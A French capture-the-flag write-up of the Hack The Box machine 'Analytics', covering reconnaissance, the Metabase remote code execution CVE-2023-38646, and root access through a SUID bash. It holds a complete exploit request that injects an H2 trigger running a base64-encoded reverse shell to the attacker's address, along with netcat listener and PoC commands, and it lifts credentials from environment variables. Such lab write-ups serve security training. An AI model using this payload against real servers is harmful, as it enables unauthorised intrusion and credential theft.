  # Analytics

	echo "10.10.11.233 analytical.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.233 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.10.11.233 -oN nmap.txt
	feroxbuster --silent -u http://analytical.htb
	
Scans classiques.

	PORT STATE SERVICE VERSION  
	22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)  
	80/tcp open http nginx 1.18.0 (Ubuntu)

Sur le site web, on voit une page sans aucun vrai lien, sauf pour le formulaire de login qui pointe sur http://data.analytical.htb/

	echo "10.10.11.233 data.analytical.htb" >> /etc/hosts

Un peu de fuzzing supplémentaire : 

	feroxbuster --silent -u http://data.analytical.htb/
	ffuf -H "Host: FUZZ.analytical.htb" -u http://analytical.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 154

Le formulaire de login amène sur la page http://data.analytical.htb/auth/login?redirect=%2F qui indique "Sign in to Metabase".

En faisant des recherches sur les exploits liés à Metabase, on voit qu'une RCE sans authentification existe et qu'il y a déjà des PoC : 
https://github.com/securezeron/CVE-2023-38646

	rlwrap nc -nvlp 9999
	python CVE-2023-38646-Reverse-Shell.py --rhost http://data.analytical.htb/auth/login --lhost 10.10.16.19 --lport 9999

Le script échoue mais montre la requête à effectuer, il suffit de la reproduire dans Burp : 

> <br>http://data.analytical.htb/api/setup/validate 
> <br>...
> <br>{'Content-Type': 'application/   json'} 
> <br>...
> <br>{   "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",   "details": {
> <br>    "is_on_demand": false,
> <br>    "is_full_sync": false,
> <br>    "is_sample": false,
> <br>    "cache_ttl": null,
> <br>    "refingerprint": false,
> <br>    "auto_run_queries": true,
> <br>    "schedules": {},
> <br>    "details": {
> <br>      "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE
> <br>TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS
> <br>$$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c
> <br>{echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE2LjE5Lzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}')\n$$--=x",
> <br>      "advanced-options": false,
> <br>      "ssl": true
> <br>    },
> <br>    "name": "test",
> <br>    "engine": "h2"   } }

Il faut remplacer le payload contenu dans la fonction **exec()** et faire des tests avec le Repeater de Burp. Je n'ai pas réussi à comprendre et résoudre l'erreur Java qui sortait à chaque fois mais j'ai trouvé un autre PoC plus propre : https://github.com/saoGITo/HTB_Analytics

	python3  HTB_Analytics_poc.py 10.10.16.19 9999
	
On arrive sur un shell en tant que l'utilisateur "metabase" mais l'environnement semble très limité.

	ls -la /

On observe un fichier **.dockerenv**

	env 

On obtient des identifiants dans les variables d'environnement : 

> <br>META_USER=metalytics
> <br>...
> <br>META_PASS=An4lytics_ds20223#

	ssh metalytics@10.10.11.233
	cat user.txt	 

## Élévation de privilèges

	sudo -l
	find / -perm /4000 2>/dev/null

Un bash avec SUID semble présent dans **/var/tmp/bash** :

	/var/tmp/bash -p
	whoami
	cat /root/root.txt


